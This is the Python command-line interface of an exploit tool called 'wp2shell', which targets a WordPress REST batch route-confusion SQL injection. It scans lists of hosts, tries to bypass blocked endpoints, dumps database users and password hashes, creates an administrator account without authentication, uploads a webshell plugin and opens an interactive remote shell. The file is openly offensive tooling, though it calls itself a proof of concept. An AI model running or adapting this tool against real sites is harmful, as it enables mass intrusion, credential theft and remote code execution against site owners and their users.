"""Command-line interface."""

from __future__ import annotations

import argparse
import datetime
import os
import re
import shlex
import ssl
import sys
import time
from typing import List, Optional

from . import __version__
from .client import BatchClient, TargetError
from .exploit import PreAuthAdminCreator
from .shell import AdminSession
from .sqli import BlindSQLi, CountBasedSQLi, ErrorBasedSQLi, UnionSQLi
from .version import public_version_hints, version_status, wordpress_markers

try:
    import readline  # noqa: F401 - enables line editing/history for the interactive prompt
except ImportError:
    pass

_TTY = sys.stdout.isatty()


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _TTY else text


def info(msg: str) -> None:
    """Neutral info — white [*]."""
    print(f"[*] {msg}")


def good(msg: str) -> None:
    """Positive confirmation — green [+] (e.g. markers found, SQLi confirmed)."""
    print(_paint("32", f"[+] {msg}"))


def vuln(msg: str) -> None:
    """Vulnerability confirmed — bold red [VULN]. Reserved for VULNERABLE findings only."""
    print(_paint("1;31", f"[VULN] {msg}"))


def bad(msg: str) -> None:
    """Negative/failure result — gray [-] (e.g. not WordPress, not vulnerable, unreachable)."""
    print(_paint("90", f"[-] {msg}"))


def warn(msg: str) -> None:
    """Warning — yellow [!] (e.g. worth revisiting, WAF detected, partial confirmation)."""
    print(_paint("33", f"[!] {msg}"))


def _progress(text: str) -> None:
    # Single updating line on a terminal; suppressed when output is piped or redirected.
    if _TTY:
        sys.stdout.write("\r\033[K    " + text)
        sys.stdout.flush()


def _clear_progress() -> None:
    if _TTY:
        sys.stdout.write("\r\033[K")
        sys.stdout.flush()


def _client(args: argparse.Namespace) -> BatchClient:
    return BatchClient(
        args.url,
        timeout=args.timeout,
        proxy=args.proxy,
        verify_ssl=not args.no_verify_ssl,
        verbosity=args.verbose or 0,
    )


def _short(text: str, *, limit: int = 96) -> str:
    if len(text) <= limit:
        return text
    return text[: limit - 3] + "..."


def _print_wordpress_markers(client: BatchClient, homepage=None) -> tuple:
    markers = wordpress_markers(client, homepage)
    if markers:
        info(f"WordPress markers found ({' / '.join(markers)})")
    else:
        warn("No public WordPress markers found.")
    return markers


def _print_version_hints(client: BatchClient, homepage=None) -> tuple:
    hints = public_version_hints(client, homepage)
    if not hints:
        warn("No public WordPress version hints found.")
        return hints

    info("Public WordPress version hints:")
    for hint in hints:
        line = (
            f"    - {hint.version} via {hint.source} "
            f"({version_status(hint.version)}) - {_short(hint.detail)}"
        )
        print(_paint("33", line) if hint.affected else _paint("32", line))
    if any(hint.affected for hint in hints):
        warn("A public version hint falls in the wp2shell affected range; verify internally or confirm with authorization.")
    return hints


# -- commands ---------------------------------------------------------------


_URL_RE = re.compile(r"https?://\S+$", re.IGNORECASE)
# A bare host: a domain-with-TLD or an IPv4, with an optional :port and /path, no scheme, no spaces.
_HOST_RE = re.compile(
    r"^(?:(?:[A-Za-z0-9_-]+\.)+[A-Za-z]{2,}|(?:\d{1,3}\.){3}\d{1,3})(?::\d{1,5})?(?:/\S*)?$"
)


def _probe_scheme(host: str) -> str:
    """Probe scheme and www-prefix for a bare host; return whichever base URL responds first.

    Tries in order: https://host, https://www.host, http://host, http://www.host.
    Falls back to ``https://host`` if none answer within 5 seconds.
    """
    import urllib.request as _req
    candidates = []
    for scheme in ("https", "http"):
        candidates.append(f"{scheme}://{host}")
        if not host.startswith("www."):
            candidates.append(f"{scheme}://www.{host}")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = _req.build_opener(_req.HTTPSHandler(context=ctx))
    for base in candidates:
        try:
            resp = opener.open(_req.Request(base + "/", method="HEAD", headers={"User-Agent": "wp2shell"}), timeout=5)
            if resp.status < 400:
                return base
        except urllib.error.HTTPError as exc:
            # 3xx/4xx still mean the server is reachable and the scheme works.
            if exc.code < 500:
                return base
        except Exception:
            continue
    return f"https://{host}"


def _as_target(line: str) -> Optional[str]:
    """Return a scannable base URL for one input line, or None if it is not a URL or host.

    A line already carrying an http(s):// scheme is used as-is; a bare host (``example.com``,
    ``10.0.0.1:8443``, ``host/path``) is probed to determine whether HTTPS or HTTP responds,
    and the appropriate scheme is used. Blank lines, comments (#...), wildcards and anything
    else are skipped.
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if _URL_RE.match(line):
        return line
    if _HOST_RE.match(line):
        return _probe_scheme(line)
    return None


def _resolve_targets(value: str) -> List[str]:
    """Resolve the check target(s): a single URL/host, or the URLs/hosts listed in a file.

    Bare hosts are scanned over https://. A file may mix URLs and hosts, one per line; blank lines,
    comments (#...) and non-target lines (wildcards, prose, ...) are ignored. A file with no
    scannable target is rejected.
    """
    if not os.path.isfile(value):
        target = _as_target(value)
        if target:
            return [target]
        raise ValueError(f"{value!r} is not a URL, a host, or a file of targets")
    targets: List[str] = []
    seen = set()
    with open(value, encoding="utf-8", errors="replace") as handle:
        for line in handle:
            target = _as_target(line)
            if target and target not in seen:
                seen.add(target)
                targets.append(target)
    if not targets:
        raise ValueError(f"{value}: no scannable URLs or hosts found in file")
    return targets


def cmd_check(args: argparse.Namespace) -> int:
    try:
        targets = _resolve_targets(args.url)
    except ValueError as exc:
        bad(str(exc))
        return 2
    if len(targets) == 1:
        return _check_one(targets[0], args)

    info(f"Scanning {len(targets)} targets from {args.url}")
    scan_start = time.monotonic()
    vulnerable = 0
    vuln_urls: List[str] = []
    revisit_urls: List[str] = []
    for index, url in enumerate(targets, start=1):
        print()
        info(f"[{index}/{len(targets)}] {url}")
        t0 = time.monotonic()
        try:
            rc = _check_one(url, args)
        except TargetError as exc:
            bad(str(exc))
            rc = 1
        elapsed = time.monotonic() - t0
        info(f"Completed in {elapsed:.1f}s")
        if rc == 0:
            vulnerable += 1
            vuln_urls.append(url)
        elif rc == 3:
            revisit_urls.append(url)
    scan_elapsed = time.monotonic() - scan_start
    mins, secs = divmod(int(scan_elapsed), 60)
    elapsed_str = f"{mins}m {secs}s" if mins else f"{secs}s"
    print()
    print("─" * 60)
    (vuln if vulnerable else info)(
        f"Scan complete in {elapsed_str} — {vulnerable}/{len(targets)} vulnerable."
    )
    if vuln_urls:
        vuln("Vulnerable targets:")
        for u in vuln_urls:
            print(f"    {u}")
    if revisit_urls:
        warn("Worth revisiting — affected WP version but batch WAF-blocked:")
        for u in revisit_urls:
            print(f"    {u}")
    # Auto-save vulnerable + revisit URLs to a dated file.
    if vuln_urls or revisit_urls:
        stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
        out_path = f"vuln-{stamp}.txt"
        with open(out_path, "w") as fh:
            if vuln_urls:
                fh.write("# VULNERABLE\n")
                fh.writelines(f"{u}\n" for u in vuln_urls)
            if revisit_urls:
                fh.write("# WORTH REVISITING (affected WP version, batch WAF-blocked)\n")
                fh.writelines(f"{u}\n" for u in revisit_urls)
        info(f"Results saved to: {out_path}")
    print("─" * 60)
    return 0 if vulnerable else 2


def _batch_status_reason(status: int) -> str:
    """Reason a batch response wasn't 207, for the statuses WordPress actually documents for a
    restricted/absent REST route (reads as 'is {reason}'). Any other status stays neutral -- the raw
    code is always printed alongside -- rather than asserting an unverified interpretation.
    """
    if status == 401:
        return "behind authentication"  # WP rest_not_logged_in
    if status == 403:
        return "forbidden (WAF, edge rule, or REST restriction)"  # WP rest_disabled, or an edge WAF
    if status == 404:
        return "not found"  # WP rest_no_route
    return "unavailable"


def _check_one(url: str, args: argparse.Namespace) -> int:
    # Only --confirm-sqli's timing probe sleeps server-side and needs the +10 floor; a plain scan
    # honors --timeout directly, so a low value skips dead hosts fast.
    timeout = max(args.timeout, args.sleep + 10) if args.confirm_sqli else args.timeout
    verbosity = args.verbose or 0
    client = BatchClient(url, timeout=timeout, proxy=args.proxy, verify_ssl=not args.no_verify_ssl, verbosity=verbosity)
    # Reachability gate, reusing the homepage the markers/version stages need: a dead host fails
    # here after one timeout instead of on every probe.
    try:
        homepage = client.get("/")
    except TargetError as exc:
        # If HTTPS failed with an SSL error, transparently retry over HTTP.
        if url.startswith("https://") and (
            "CERTIFICATE_VERIFY_FAILED" in str(exc)
            or "TLSV1" in str(exc)
            or "ssl" in str(exc).lower()
        ):
            http_url = "http://" + url[len("https://"):]
            info(f"SSL error — retrying over HTTP: {http_url}")
            client = BatchClient(http_url, timeout=timeout, proxy=args.proxy, verify_ssl=False, verbosity=verbosity)
            try:
                homepage = client.get("/")
            except TargetError as exc2:
                bad(str(exc2))
                return 1
        else:
            bad(str(exc))
            return 1
    ip, server = client.server_info()
    info(f"IP: {ip} | Server: {server}")
    wp_markers = _print_wordpress_markers(client, homepage)
    hints = _print_version_hints(client, homepage)

    probe = client.marker_probe()
    if client._active_endpoint != client._ENDPOINT_VARIANTS[0] or client._active_headers:
        bypass_desc = client._active_endpoint
        if client._active_headers:
            header_desc = ", ".join(f"{k}: {v}" for k, v in client._active_headers.items())
            bypass_desc += f" [header: {header_desc}]"
        warn(f"Primary endpoint blocked; bypassed via {bypass_desc}")
    if probe.status != 207:
        # A patched WordPress still answers 207 (below); a non-207 means no batch endpoint here --
        # only call it WordPress if a marker/hint did.
        reason = _batch_status_reason(probe.status)
        if wp_markers or hints:
            bad(f"Batch endpoint returned HTTP {probe.status} (not 207) — WordPress detected, but its "
                f"batch endpoint is {reason}.")
            # Return 3 when WP version is in the affected range but batch is WAF-blocked —
            # patching hasn't been confirmed; worth revisiting with different tooling.
            if hints and any(h.affected for h in hints):
                return 3
        else:
            bad(f"Batch endpoint returned HTTP {probe.status} (not 207), and no WordPress markers or "
                f"version hints; batch endpoint is {reason} — likely not WordPress.")
        return 1
    markers = client.batch_marker_codes(probe)
    if markers:
        info(f"Batch probe -> HTTP 207; markers matched: {', '.join(markers)}")
    else:
        good("Batch endpoint reachable and unauthenticated (HTTP 207).")

    route_confusion = client.has_route_confusion_markers(probe)
    if route_confusion:
        vuln("VULNERABLE — batch route-confusion behavior detected.")
        if not args.confirm_sqli:
            info("SQLi confirmation not sent; use --confirm-sqli for the active SQLi probe.")
            return 0
    elif not args.confirm_sqli:
        bad("Route-confusion marker pattern not detected.")
        if any(hint.affected for hint in hints):
            warn("Version suggests exposure, but the batch marker probe did not show vulnerable behavior.")
        return 2

    union = UnionSQLi(client)
    try:
        union_ok = union.available()
    except TargetError as exc:
        warn(f"UNION SQLi probe failed: {exc}")
        union_ok = False
    if union_ok:
        vuln("SQLi confirmed — UNION fake-post read returned data.")
        return 0
    info("UNION SQLi confirmation unavailable; trying boolean blind confirmation.")

    blind = BlindSQLi(client, sleep=args.sleep)
    try:
        if blind.confirm_boolean():
            vuln("SQLi confirmed — boolean blind oracle distinguishes tautology from contradiction.")
            return 0
    except TargetError as exc:
        warn(f"Boolean confirmation failed: {exc}")
    info("Boolean blind unavailable; falling back to timing confirmation.")

    try:
        result = blind.confirm_timing(samples=args.samples)
    except TargetError as exc:
        warn(f"Timing confirmation failed (network timeout): {exc}")
        if route_confusion:
            warn("Route-confusion marker pattern still confirmed; a WAF may be filtering SQLi payloads.")
            return 0
        bad("Could not confirm SQLi and route-confusion markers were not detected.")
        return 1
    if args.samples > 1:
        details = ", ".join(
            f"{base:.2f}s->{delay:.2f}s" for base, delay in result.samples
        )
        info(f"Timing samples: {details}")
        info(f"Median delta {result.delta:.2f}s; threshold {result.threshold:.2f}s.")
    if result.confirmed:
        vuln(f"SQL timing confirmed — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
        return 0
    if route_confusion:
        warn(
            f"SQL timing not confirmed — baseline {result.baseline:.2f}s, injected "
            f"{result.delayed:.2f}s; route-confusion marker pattern still detected."
        )
        warn("A WAF or edge rule may be filtering the SQLi payload; the route-confusion bug still looks present.")
        return 0
    bad(f"Not timing-confirmed — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
    warn("This may be a patched target, or a WAF/edge rule filtering the SQLi payload.")
    if any(hint.affected for hint in hints):
        warn("Version suggests exposure, but the timing payload did not execute or was blocked.")
    return 2


def _reader(args: argparse.Namespace, client: BatchClient):
    """Pick the extraction technique.

    auto prefers the fastest in-band method that works: UNION (one request per value, forges a fake
    WP_Post), then count-based (encodes 7 bits per character into X-WP-Total — immune to object
    cache), then error-based (needs reflected DB errors), then blind binary search.
    """
    if args.technique in ("auto", "union"):
        union = UnionSQLi(client)
        if union.available():
            good("UNION extraction available (in-band, one request per value) — using it.")
            return union
        if args.technique == "union":
            bad("UNION extraction requested but the forged post was not reflected.")
            return None
        info("UNION extraction unavailable; trying count-based oracle.")
    if args.technique in ("auto", "count"):
        count_based = CountBasedSQLi(client)
        if count_based.available():
            good("Count-based extraction available (X-WP-Total oracle, ~1 request per char) — using it.")
            return count_based
        if args.technique == "count":
            bad("Count-based extraction requested but the X-WP-Total oracle is not responding.")
            return None
        info("Count-based oracle unavailable; trying error-based.")
    if args.technique in ("auto", "error"):
        error_based = ErrorBasedSQLi(client)
        if error_based.available():
            good("Error-based extraction available (target reflects DB errors) — using it.")
            return error_based
        if args.technique == "error":
            bad("Error-based extraction requested but the target does not reflect DB errors.")
            return None
        info("Target does not reflect DB errors; falling back to blind extraction.")
    return BlindSQLi(client)


def cmd_read(args: argparse.Namespace) -> int:
    client = _client(args)
    sqli = _reader(args, client)
    if sqli is None:
        return 2

    if args.query:
        info(f"Reading: {args.query}")
        value = sqli.extract(args.query, max_length=args.max_length, on_char=_progress)
        _clear_progress()
        good(f"Result: {value}")
    elif args.preset == "fingerprint":
        for label, expr in (
            ("MySQL version", "SELECT @@version"),
            ("Database user", "SELECT CURRENT_USER()"),
            ("Database name", "SELECT DATABASE()"),
        ):
            good(f"{label}: {sqli.extract(expr, max_length=args.max_length)}")
    elif args.preset == "users":
        table = f"{args.prefix}users"
        total = sqli.integer(f"SELECT COUNT(*) FROM {table}")
        info(f"{total} user(s) in {table}.")
        for offset in range(total):
            row = sqli.extract(
                f"SELECT CONCAT_WS(0x7c, ID, user_login, user_pass) "
                f"FROM {table} ORDER BY ID LIMIT {offset},1",
                max_length=args.max_length,
                on_char=_progress,
            )
            _clear_progress()
            good(row)

    info(f"{sqli.requests} request(s) sent.")
    return 0


_CWD_MARK = "__wp2shellcwd__"  # shell-metacharacter-free so it survives the remote shell


def _repl(session: AdminSession, path: str) -> None:
    """A minimal interactive prompt piping each line through the webshell.

    Commands are stateless server-side, so the working directory is tracked client-side and
    re-applied to each command (which makes `cd` behave as expected).
    """
    pwd = session.run(path, "pwd")
    if pwd is None:
        bad("webshell not responding; aborting interactive mode.")
        return
    cwd = pwd.strip() or "/"
    info("Interactive shell — type commands, 'exit' or Ctrl-D to quit.")
    while True:
        try:
            line = input(_paint("36", f"{cwd} $ "))
        except (EOFError, KeyboardInterrupt):
            print()
            return
        command = line.strip()
        if not command:
            continue
        if command in ("exit", "quit"):
            return
        out = session.run(
            path, f"cd {shlex.quote(cwd)} 2>/dev/null; {command}; printf '{_CWD_MARK}%s' \"$(pwd)\""
        )
        if out is None:
            bad("no response from webshell")
            continue
        body, marker, tail = out.rpartition(_CWD_MARK)
        if marker:
            cwd = tail.strip() or cwd
            out = body
        out = out.rstrip("\n")
        if out:
            print(out)


def cmd_shell(args: argparse.Namespace) -> int:
    if not args.cmd and not args.interactive:
        bad("specify --cmd or --interactive")
        return 2
    if bool(args.user) != bool(args.password):
        bad("specify both --user and --password, or omit both to use the pre-auth bridge")
        return 2

    warn("This uploads a plugin containing a webshell to the target.")

    generated_admin = None
    username, password = args.user, args.password
    if username is None:
        warn("No credentials supplied; attempting pre-auth administrator creation.")
        creator = PreAuthAdminCreator(
            args.url,
            timeout=args.timeout,
            proxy=args.proxy,
            verify_ssl=not args.no_verify_ssl,
        )
        info("Creating administrator through the SQLi-to-customizer bridge...")
        generated_admin = creator.create_admin()
        username, password = generated_admin.username, generated_admin.password
        good(f"Administrator created: {username}")
        good(f" email: {generated_admin.email}")
        good(f" password: {password}")

    session = AdminSession(args.url, timeout=args.timeout, proxy=args.proxy, verify_ssl=not args.no_verify_ssl)

    info(f"Authenticating as {username!r}...")
    if not session.login(username, password):
        bad("Login failed.")
        if generated_admin:
            warn("Administrator account exists but login was blocked (WAF or login page restriction).")
            warn(f"Log in manually with: {username} / {password}")
            warn("The generated account was NOT auto-removed — delete it when done.")
        return 1
    good("Authenticated.")

    info("Deploying webshell plugin...")
    path = session.deploy_webshell()
    good(f"Webshell: {args.url.rstrip('/')}{path}")

    rc = 0
    try:
        if args.cmd:
            output = session.run(path, args.cmd)
            if output is None:
                bad("No output — the upload likely failed (nonce/permissions) or the plugin is not web-served.")
                rc = 1
            else:
                print()
                print(output.rstrip("\n"))
                print()

        if args.interactive:
            _repl(session, path)
    finally:
        if generated_admin:
            info("Deleting generated administrator...")
            try:
                removed_admin = session.delete_user_with_shell(
                    path,
                    generated_admin.username,
                    reassign_to=generated_admin.source_admin_id,
                )
            except Exception:  # noqa: BLE001 - continue to remove the webshell.
                removed_admin = False
            if removed_admin:
                good("Generated administrator removed from the target.")
            else:
                bad(f"Generated administrator cleanup failed: {generated_admin.username}:{generated_admin.password}")
                rc = 1

        info("Cleaning up webshell...")
        try:
            removed = session.cleanup(path)
        except Exception as exc:  # noqa: BLE001 - cleanup must not hide the original failure
            bad(f"Webshell cleanup failed ({exc}).")
            rc = 1
        else:
            if removed:
                good("Webshell removed from the target.")
            else:
                bad("Webshell cleanup failed.")
                rc = 1
    return rc


# -- parser -----------------------------------------------------------------


def _add_common(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("url", help="target base URL, e.g. http://target")
    parser.add_argument("--timeout", type=float, default=15.0, help="request timeout (default: 15)")
    parser.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="wp2shell",
        description="WordPress REST batch route-confusion SQLi PoC associated with wp2shell.",
    )
    parser.add_argument("--version", action="version", version=f"wp2shell {__version__}")
    parser.add_argument("--no-verify-ssl", action="store_true", help="disable SSL certificate verification")
    parser.add_argument(
        "-v", "--verbose",
        action="count",
        default=0,
        help="-v: show each HTTP request (method, URL, status, elapsed); -vv: also show full request/response bodies",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    check = sub.add_parser(
        "check",
        help="confirm the vulnerability on a URL, or scan a file of URLs (non-destructive)",
    )
    _add_common(check)
    check.add_argument(
        "--sleep",
        type=float,
        default=3.0,
        help="SQL timing delay used by the --confirm-sqli fallback (default: 3)",
    )
    check.add_argument(
        "--samples",
        type=int,
        default=3,
        help="baseline/delayed SQL timing pairs used by the --confirm-sqli fallback (default: 3)",
    )
    check.add_argument(
        "--confirm-sqli",
        action="store_true",
        help="also send an active SQLi confirmation payload",
    )
    check.set_defaults(func=cmd_check)

    read = sub.add_parser("read", help="read from the database via blind SQL injection")
    _add_common(read)
    group = read.add_mutually_exclusive_group()
    group.add_argument(
        "--preset",
        choices=("fingerprint", "users"),
        default="fingerprint",
        help="fingerprint (version/user/db) or users (logins and password hashes)",
    )
    group.add_argument("--query", help='scalar SQL expression to read, e.g. "SELECT @@version"')
    read.add_argument("--prefix", default="wp_", help="database table prefix (default: wp_)")
    read.add_argument("--max-length", type=int, default=128, help="max characters per value")
    read.add_argument(
        "--technique",
        choices=("auto", "union", "count", "blind", "error"),
        default="auto",
        help="extraction technique: auto (union -> count -> error-based -> blind), union (in-band, "
        "forges a fake WP_Post; one request per value), count (X-WP-Total oracle, ~1 req/char, "
        "immune to object cache), error (in-band, needs visible DB errors), or blind "
        "(bit-by-bit boolean/timing)",
    )
    read.set_defaults(func=cmd_read)

    shell = sub.add_parser("shell", help="plugin shell; with credentials or via the pre-auth bridge")
    _add_common(shell)
    shell.add_argument("--user", help="admin username; omit with --password to use the pre-auth bridge")
    shell.add_argument("--password", help="admin password; omit with --user to use the pre-auth bridge")
    shell.add_argument("--cmd", help="command to run on the target (omit when using --interactive)")
    shell.add_argument("-i", "--interactive", action="store_true",
                       help="open an interactive shell after deploying")
    shell.set_defaults(func=cmd_shell)

    return parser


def main(argv: Optional[list] = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        return args.func(args)
    except KeyboardInterrupt:
        return 130
    except Exception as exc:  # noqa: BLE001 - surface a clean message, not a traceback
        bad(str(exc))
        return 1
